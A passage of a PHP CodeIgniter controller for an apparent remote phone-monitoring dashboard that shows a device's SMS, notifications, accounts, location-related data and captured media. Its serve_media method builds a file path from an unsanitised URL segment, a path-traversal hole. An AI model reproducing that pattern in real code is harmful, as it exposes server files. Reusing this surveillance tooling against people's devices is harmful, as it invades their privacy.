<?php

namespace App\Controllers\clients;

use App\Models\Mod_Crypt;
use CodeIgniter\API\ResponseTrait;

class Advanced extends BaseClientController
{
    use ResponseTrait;

    private const DETAIL_PER_PAGE = 50;

    private function commonData(string $active, string $title): array
    {
        $counts = $this->getUserDataCounts();
        return array_merge($counts, [
            'pag' => 'advanced',
            'title' => $title,
            'nav_urls' => $this->getAdvancedNavUrls($active, $counts),
            'active_tab' => $active,
        ]);
    }

    /**
     * Navigation tabs shared across all advanced pages.
     */
    private function getAdvancedNavUrls(string $activeView, array $counts = []): string
    {
        $hardware_tabs = ['device_context', 'network_info', 'bluetooth', 'sensors', 'camera_info', 'battery_stats', 'processes', 'proc_info', 'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'hardware_graphics', 'hardware_network'];
        $software_tabs = ['accounts', 'calendar', 'app_usage', 'notifications', 'security_audit', 'accessibility', 'input_methods', 'remote_media', 'data_usage', 'saved_wifi', 'default_apps', 'alarms', 'app_security', 'network_security', 'telephony_network', 'system_locale'];

        $is_hardware = in_array($activeView, $hardware_tabs) || $activeView === 'hardware_landing';
        $is_software = in_array($activeView, $software_tabs) || $activeView === 'software_landing';

        $html = '<div class="d-flex justify-content-end flex-wrap mb-3" style="gap: 8px;">';
        $html .= sprintf(
            '<a class="btn btn-sm %s" href="%s"><i class="fas fa-microchip mr-1"></i> Hardware</a>',
            $is_hardware ? 'btn-primary' : 'btn-outline-secondary',
            base_url('advanced/hardware')
        );
        $html .= sprintf(
            '<a class="btn btn-sm %s" href="%s"><i class="fas fa-laptop-code mr-1"></i> Software</a>',
            $is_software ? 'btn-primary' : 'btn-outline-secondary',
            base_url('advanced/software')
        );
        $html .= '</div>';
        return $html;
    }

    /** GET /advanced/device */

    public function device_context()
    {
        $data = array_merge($this->commonData('device_context', 'Device Context'), [
            'rows' => $this->finderModel->get_device_context($this->userId),
            'total' => $this->finderModel->get_count_DeviceContext($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/device_context', $data);
    }

    /** GET /advanced/network */
    public function network_info()
    {
        $rows = $this->finderModel->get_network_info($this->userId);
        // Attach nearby wifi to each row
        foreach ($rows as &$row) {
            $row['nearby_wifi'] = $this->finderModel->get_nearby_wifi($row['id']);
        }
        $data = array_merge($this->commonData('network_info', 'Network Info'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_NetworkInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/network_info', $data);
    }

    /** GET /advanced/accounts */
    public function accounts()
    {
        $data = array_merge($this->commonData('accounts', 'Device Accounts'), [
            'rows' => $this->finderModel->get_accounts($this->userId),
            'total' => $this->finderModel->get_count_Accounts($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/accounts', $data);
    }

    /** GET /analysis/advanced_timeline */
    public function timeline()
    {
        $events = $this->finderModel->get_timeline_events($this->userId, 50);

        // Enrich events (e.g. decode SMS)
        foreach ($events as &$ev) {
            if ($ev['event_type'] === 'sms' && !empty($ev['meta2'])) {
                $ev['meta2'] = base64_decode($ev['meta2']);
            }
        }

        $total = $this->finderModel->get_count_timeline_events($this->userId);

        $data = array_merge($this->commonData('timeline', 'Device Timeline'), [
            'events' => $events,
            'total' => $total,
            'pager' => $this->finderModel->getPager(),
            'pag' => 'timeline', // Ensure sidebar makes Timeline active!
        ]);

        return $this->renderAppView('users/advanced/timeline', $data);
    }

    /** GET /advanced/calendar */
    public function calendar()
    {
        $data = array_merge($this->commonData('calendar', 'Calendar Events'), [
            'rows' => $this->finderModel->get_calendar_events($this->userId),
            'total' => $this->finderModel->get_count_Calendar($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/calendar', $data);
    }

    /** GET /advanced/app-usage */
    public function app_usage()
    {
        $rows = $this->enrichAppUsageGroupedRows(
            $this->finderModel->get_app_usage_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('app_usage', 'App Usage'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_app_usage_packages($this->userId),
            'total_snapshots' => $this->finderModel->get_count_AppUsage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/app_usage', $data);
    }

    /** GET /advanced/app-usage/{package} */
    public function app_usage_detail(string $encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_app_usage_package_summary($this->userId, $packageName);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $sessions = $this->enrichAppUsageSessions(
            $this->finderModel->get_app_usage_sessions_for_package(
                $this->userId,
                $packageName,
                self::DETAIL_PER_PAGE
            )
        );

        // Build background_time map from session events per app_usage_id
        $bgTimeMap = $this->computeBackgroundTimeFromSessions($sessions);

        $summary['last_used_display'] = $this->formatMsDatetime($summary['last_time_used'] ?? null, 'M d, Y, l H:i');

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $packageName);

        $data = array_merge($this->commonData('app_usage', 'App Usage — ' . ($summary['app_name'] ?? $packageName)), [
            'rows' => $this->enrichAppUsageDetailRows(
                $this->finderModel->get_app_usage_for_package($this->userId, $packageName, self::DETAIL_PER_PAGE),
                $bgTimeMap
            ),
            'total' => $this->finderModel->get_count_app_usage_for_package($this->userId, $packageName),
            'pager' => $this->finderModel->getPager(),
            'package_name' => $packageName,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'sessions' => $sessions,
            'back_url' => base_url('advanced/software/app-usage'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/app_usage_detail', $data);
    }

    /** GET /advanced/notifications */
    public function notifications()
    {
        $rows = $this->enrichNotificationGroupedRows(
            $this->finderModel->get_notifications_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('notifications', 'Notifications'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_notification_groups($this->userId),
            'total_notifications' => $this->finderModel->get_count_Notifications($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/notifications', $data);
    }

    /** GET /advanced/notifications/{group} */
    public function notification_detail(string $encodedPkg)
    {
        $groupKey = $this->decodePackageSegment($encodedPkg);
        if ($groupKey === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_notifications_group_summary($this->userId, $groupKey);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary['latest_ts_abs'] = $this->formatMsDatetime($summary['latest_timestamp'] ?? null, 'M d, Y, l H:i');
        $summary['latest_ts_rel'] = $this->formatRelativeTime($summary['latest_timestamp'] ?? null);

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $groupKey);

        $data = array_merge($this->commonData('notifications', 'Notifications — ' . ($summary['display_name'] ?? $groupKey)), [
            'rows' => $this->enrichNotificationDetailRows(
                $this->finderModel->get_notifications_for_group($this->userId, $groupKey, self::DETAIL_PER_PAGE)
            ),
            'total' => $this->finderModel->get_count_notifications_for_group($this->userId, $groupKey),
            'pager' => $this->finderModel->getPager(),
            'group_key' => $groupKey,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'back_url' => base_url('advanced/software/notifications'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/notification_detail', $data);
    }

    /**
     * Decode a URL segment back to a plain package/group name.
     * Segment is simply urlencode()'d — e.g. com.twitter.android stays as-is.
     */
    private function decodePackageSegment(string $segment): ?string
    {
        if ($segment === '') {
            return null;
        }

        $decoded = urldecode($segment);

        return ($decoded !== '') ? $decoded : null;
    }

    /**
     * Encode a package/group name for safe use in a URL segment.
     * urlencode() percent-encodes special chars; dots and letters pass through unchanged.
     */
    private function encodePackageSegment(string $value): string
    {
        return urlencode($value);
    }

    private function formatMsDatetime($msTimestamp, string $format = 'Y-m-d H:i:s'): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        return date($format, (int) floor((int) $msTimestamp / 1000));
    }

    private function formatRelativeTime($msTimestamp): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        $seconds = (int) floor((int) $msTimestamp / 1000);
        $diff = time() - $seconds;

        if ($diff < 60) {
            return 'just now';
        }
        if ($diff < 3600) {
            return (int) floor($diff / 60) . ' min ago';
        }
        if ($diff < 86400) {
            return (int) floor($diff / 3600) . ' h ago';
        }
        if ($diff < 604800) {
            return (int) floor($diff / 86400) . ' d ago';
        }

        return date('Y-m-d H:i', $seconds);
    }

    private function enrichAppUsageGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $row['last_used_display'] = $this->formatMsDatetime($row['last_time_used'] ?? null, 'M d, Y, l H:i');
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['package_url_enc'] = urlencode((string) ($row['package_name'] ?? ''));
        }

        return $rows;
    }

    private function enrichNotificationGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['latest_timestamp'] ?? null;
            $row['latest_ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['latest_ts_rel'] = $this->formatRelativeTime($ts);
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['group_url_enc'] = urlencode((string) ($row['group_key'] ?? ''));
            $row['latest_title_short'] = mb_strimwidth($row['latest_title'] ?? '—', 0, 60, '…');
        }

        return $rows;
    }

    /**
     * Compute total background time per app_usage_id from session events.
     *
     * Pairs consecutive session events: background time is accumulated
     * between a 'paused'/'closed' event and the next 'opened' event.
     *
     * @param array $sessions Enriched session rows (must contain app_usage_id, event_type, timestamp)
     * @return array<int, int> Map of app_usage_id → total background time in ms
     */
    private function computeBackgroundTimeFromSessions(array $sessions): array
    {
        // Group sessions by app_usage_id
        $grouped = [];
        foreach ($sessions as $s) {
            $id = (int) ($s['app_usage_id'] ?? 0);
            if ($id <= 0) continue;
            $grouped[$id][] = $s;
        }

        $bgMap = [];
        foreach ($grouped as $id => $events) {
            // Sort by timestamp ascending
            usort($events, fn($a, $b) => ((int)($a['timestamp'] ?? 0)) <=> ((int)($b['timestamp'] ?? 0)));

            $bgMs = 0;
            $lastBgEventTs = null; // Timestamp of last 'paused' or 'closed'
            foreach ($events as $ev) {
                $type = strtolower($ev['event_type'] ?? '');
                $ts   = (int) ($ev['timestamp'] ?? 0);
                if ($ts <= 0) continue;

                if (in_array($type, ['paused', 'closed'])) {
                    $lastBgEventTs = $ts;
                } elseif ($type === 'opened' && $lastBgEventTs !== null) {
                    $bgMs += ($ts - $lastBgEventTs);
                    $lastBgEventTs = null;
                }
            }
            if ($bgMs > 0) {
                $bgMap[$id] = $bgMs;
            }
        }

        return $bgMap;
    }

    private function enrichAppUsageDetailRows(array $rows, array $bgTimeMap = []): array
    {
        $count = count($rows);
        for ($i = 0; $i < $count; $i++) {
            $rows[$i]['last_used_display'] = $this->formatMsDatetime($rows[$i]['last_time_used'] ?? null, 'M d, Y, l H:i');
            $rows[$i]['extracted_display'] = $this->formatMsDatetime($rows[$i]['extracted_at'] ?? null, 'M d, Y, l H:i');

            $bgFromSessions = $bgTimeMap[(int)($rows[$i]['id'] ?? 0)] ?? 0;

            if ($i < $count - 1) {
                $currentFg = (int) ($rows[$i]['foreground_time_ms'] ?? 0);
                $prevFg    = (int) ($rows[$i + 1]['foreground_time_ms'] ?? 0);
                $fgDelta   = $currentFg - $prevFg;
                if ($fgDelta < 0) $fgDelta = $currentFg;

                $rows[$i]['time_taken_ms'] = $fgDelta;

                $currentExt = (int) ($rows[$i]['extracted_at'] ?? 0);
                $prevExt    = (int) ($rows[$i + 1]['extracted_at'] ?? 0);

                // Use absolute wall-clock delta regardless of row order
                if ($currentExt > 0 && $prevExt > 0) {
                    $wallDelta = abs($currentExt - $prevExt);
                    $rows[$i]['background_time_ms'] = max(0, $wallDelta - $fgDelta);
                } else {
                    $rows[$i]['background_time_ms'] = $bgFromSessions;
                }
            } else {
                $rows[$i]['time_taken_ms'] = null;
                $rows[$i]['background_time_ms'] = $bgFromSessions;
            }
        }

        return $rows;
    }

    private function enrichAppUsageSessions(array $sessions): array
    {
        foreach ($sessions as &$row) {
            $row['timestamp_display'] = $this->formatMsDatetime($row['timestamp'] ?? null, 'M d, Y, l H:i');
        }

        return $sessions;
    }

    private function enrichNotificationDetailRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['notification_timestamp'] ?? null;
            $row['ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['ts_rel'] = $this->formatRelativeTime($ts);
        }

        return $rows;
    }

    /** GET /advanced/bluetooth */
    public function bluetooth()
    {
        $rows = $this->finderModel->get_bluetooth($this->userId);
        $data = array_merge($this->commonData('bluetooth', 'Bluetooth'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_Bluetooth($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/bluetooth', $data);
    }

    /** GET /advanced/sensors */
    public function sensors()
    {
        $data = array_merge($this->commonData('sensors', 'Sensor Profile'), [
            'rows' => $this->finderModel->get_sensor_profile($this->userId),
            'total' => $this->finderModel->get_count_Sensors($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/sensors', $data);
    }

    /** GET /advanced/security_audit */
    public function security_audit()
    {
        $rows = $this->finderModel->get_security_audit($this->userId);
        foreach ($rows as &$r) {
            $r['ts_display'] = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
        }
        unset($r);
        $data = array_merge($this->commonData('security_audit', 'Security Audit'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_SecurityAudit($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/security_audit', $data);
    }

    /** GET /remote-device */
    public function remote_device()
    {
        $userModel = new \App\Models\Mod_User();
        $devices = $userModel->get_user_devices_from_profile($this->userId);

        $targetDevice = null;
        $deviceIds = array_column($devices, 'device_id');

        if (!empty($deviceIds)) {
            $db = \Config\Database::connect();
            $targetDevice = $db->table('tbl_device_profile')
                ->whereIn('device_id', $deviceIds)
                ->where('fcm_token !=', '')
                ->where('fcm_token IS NOT NULL')
                ->orderBy('counter', 'DESC') // Bottom-most record in the table
                ->get()
                ->getRowArray();
        }

        $recentUploadSources = [];
        if ($targetDevice) {
            $db = \Config\Database::connect();
            $recentUploadSources = $db->table('uploaded_files')
                ->select('upload_source, COUNT(*) as count')
                ->where('token_owner_id', $this->userId)
                ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
                ->groupBy('upload_source')
                ->get()
                ->getResultArray();
        }

        $counts = $this->getUserDataCounts();
        $data = array_merge($counts, [
            'pag' => 'remote_device',
            'title' => 'Remote Device Control',
            'targetDevice' => $targetDevice,
            'recentUploadSources' => $recentUploadSources,
        ]);

        return $this->renderAppView('users/advanced/remote_device', $data);
    }

    /** GET /advanced/media */
    public function remote_media()
    {
        $data = array_merge($this->commonData('remote_media', 'Remote Media Forensic'), [
            'rows' => $this->finderModel->get_captured_media($this->userId),
            'total' => $this->finderModel->get_count_CapturedMedia($this->userId),
        ]);
        return $this->renderAppView('users/advanced/remote_media', $data);
    }

    /** GET /advanced/media/serve/(:any) */
    public function serve_media($filename)
    {
        $path = WRITEPATH . 'uploads/captured/' . $filename;
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $filename;
        }

        if (!file_exists($path)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $mimeType = mime_content_type($path);
        return $this->response
            ->setHeader('Content-Type', $mimeType)
            ->setBody(file_get_contents($path));
    }

    /** POST /advanced/media/delete/(:num) */
    public function delete_media($id)
    {
        $media = $this->finderModel->get_captured_media_by_id($id, $this->userId);
        if (!$media) {
            return $this->failNotFound('Media record not found');
        }

        // Delete physical file
        $path = WRITEPATH . 'uploads/captured/' . $media['stored_filename'];
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $media['stored_filename'];
        }

        if (file_exists($path)) {
            @unlink($path);
        }

        // Delete database record
        if ($this->finderModel->delete_captured_media($id, $this->userId)) {
            return $this->respondDeleted(['success' => true, 'message' => 'Media deleted successfully']);
        }

        return $this->fail('Failed to delete media record');
    }

    /** POST /advanced/app-usage/delete/(:num) */
    public function delete_app_usage($id)
    {
        if ($this->finderModel->delete_app_usage((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'App usage snapshot deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete snapshot.']);
    }

    /** POST /advanced/notifications/delete-row/(:num) */
    public function delete_notification_row($id)
    {
        if ($this->finderModel->delete_notification((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Notification deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete notification.']);
    }

    /** POST /advanced/notifications/delete/(:any) */
    public function delete_notifications_by_app($pkgEnc = null)
    {
        // Support both route segment and POST data
        if ($pkgEnc === null) {
            // Try POST parameter first, then URI segment
            $pkgEnc = $this->request->getPost('pkg') ?? $this->request->uri->getSegment(4);
        }
        $packageName = $this->decodePackageSegment($pkgEnc);
        if (!$packageName) {
            // Set flash error and redirect back
            $this->session->setFlashdata('error', 'Invalid package name');
            return redirect()->to(base_url('advanced/software/notifications'));
        }
        if ($this->finderModel->delete_notifications_by_app($this->userId, $packageName)) {
            $this->session->setFlashdata('success', 'All notifications for the app have been deleted');
            return redirect()->to(base_url('advanced/software/notifications'));
        }
        $this->session->setFlashdata('error', 'Failed to delete notifications for the app');
        return redirect()->to(base_url('advanced/software/notifications'));
    }

    /** POST /advanced/device/delete/(:num) */
    public function delete_device_context($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_device_context_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/network/delete/(:num) */
    public function delete_network_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_network_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/accounts/delete/(:num) */
    public function delete_accounts_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_accounts_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/calendar/delete/(:num) */
    public function delete_calendar_event($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_calendar_event((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Event deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete event.']);
    }

    /** POST /advanced/bluetooth/delete/(:num) */
    public function delete_bluetooth_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_bluetooth_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/sensors/delete/(:num) */
    public function delete_sensor_profile($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_sensor_profile((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Sensor deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete sensor.']);
    }

    /** POST /advanced/security_audit/delete/(:num) */
    public function delete_security_audit_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_security_audit_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/app-usage/delete-package/(:any) */
    public function delete_app_usage_by_package($encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid package name.']);
        }
        if ($this->finderModel->delete_app_usage_by_package($this->userId, $packageName)) {
            return $this->response->setJSON(['success' => true, 'message' => 'All usage data for this app has been deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete usage data.']);
    }

    /** GET /advanced/camera_info */
    public function camera_info()
    {
        $data = array_merge($this->commonData('camera_info', 'Camera Info'), [
            'rows' => $this->finderModel->get_camera_info($this->userId),
            'total' => $this->finderModel->get_count_CameraInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/camera_info', $data);
    }

    /** GET /advanced/battery_stats */
    public function battery_stats()
    {
        $data = array_merge($this->commonData('battery_stats', 'Battery Stats'), [
            'rows' => $this->finderModel->get_battery_stats($this->userId),
            'total' => $this->finderModel->get_count_BatteryStats($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/battery_stats', $data);
    }

    /** GET /advanced/accessibility */
    public function accessibility()
    {
        $data = array_merge($this->commonData('accessibility', 'Accessibility Services'), [
            'rows' => $this->finderModel->get_accessibility($this->userId),
            'total' => $this->finderModel->get_count_Accessibility($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/accessibility', $data);
    }

    /** GET /advanced/input_methods */
    public function input_methods()
    {
        $data = array_merge($this->commonData('input_methods', 'Input Methods (IMEs)'), [
            'rows' => $this->finderModel->get_input_methods($this->userId),
            'total' => $this->finderModel->get_count_InputMethods($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/input_methods', $data);
    }

    /** GET /advanced/processes */
    public function processes()
    {
        $data = array_merge($this->commonData('processes', 'Running Processes'), [
            'rows' => $this->finderModel->get_processes($this->userId),
            'total' => $this->finderModel->get_count_Processes($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/processes', $data);
    }

    /** POST /advanced/camera_info/delete/(:num) */
    public function delete_camera_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_camera_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/battery_stats/delete/(:num) */
    public function delete_battery_stats($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_battery_stats_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/accessibility/delete/(:num) */
    public function delete_accessibility($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_accessibility_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/input_methods/delete/(:num) */
    public function delete_input_methods($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_input_methods_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/proc_info */
    public function proc_info()
    {
        $data = array_merge($this->commonData('proc_info', 'Proc Info'), [
            'rows' => $this->finderModel->get_proc_info($this->userId),
            'total' => $this->finderModel->get_count_ProcInfo($this->userId),
        ]);
        return $this->renderAppView('users/advanced/proc_info', $data);
    }

    /** POST /advanced/proc_info/delete/(:num) */
    public function delete_proc_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_proc_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/processes/delete/(:num) */
    public function delete_processes($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_processes_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware */
    public function hardware()
    {
        $counts = $this->getUserDataCounts();
        return $this->renderAppView('users/advanced/hardware', [
            'pag' => 'advanced',
            'active_tab' => 'hardware_landing',
            'title' => 'Hardware',
            'counts' => $counts,
        ]);
    }

    /** GET /advanced/software */
    public function software()
    {
        $counts = $this->getUserDataCounts();
        return $this->renderAppView('users/advanced/software', [
            'pag' => 'advanced',
            'active_tab' => 'software_landing',
            'title' => 'Software',
            'counts' => $counts,
        ]);
    }

    // ── NEW EXTRACTORS: Hardware ──

    /** GET /advanced/hardware/cell_towers */
    public function cell_towers()
    {
        $data = array_merge($this->commonData('cell_towers', 'Cell Towers'), [
            'rows' => $this->finderModel->get_cell_towers($this->userId),
            'total' => $this->finderModel->get_count_CellTowers($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/cell_towers', $data);
    }

    /** POST /advanced/hardware/cell_towers/delete/(:num) */
    public function delete_cell_towers($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_cell_towers_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/display_info */
    public function display_info()
    {
        $data = array_merge($this->commonData('display_info', 'Display Info'), [
            'rows' => $this->finderModel->get_display_info($this->userId),
            'total' => $this->finderModel->get_count_DisplayInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/display_info', $data);
    }

    /** POST /advanced/hardware/display_info/delete/(:num) */
    public function delete_display_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_display_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/storage */
    public function storage()
    {
        $data = array_merge($this->commonData('storage', 'Storage'), [
            'rows' => $this->finderModel->get_storage($this->userId),
            'total' => $this->finderModel->get_count_Storage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/storage', $data);
    }

    /** POST /advanced/hardware/storage/delete/(:num) */
    public function delete_storage($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_storage_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/thermal */
    public function thermal()
    {
        $data = array_merge($this->commonData('thermal', 'Thermal'), [
            'rows' => $this->finderModel->get_thermal($this->userId),
            'total' => $this->finderModel->get_count_Thermal($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/thermal', $data);
    }

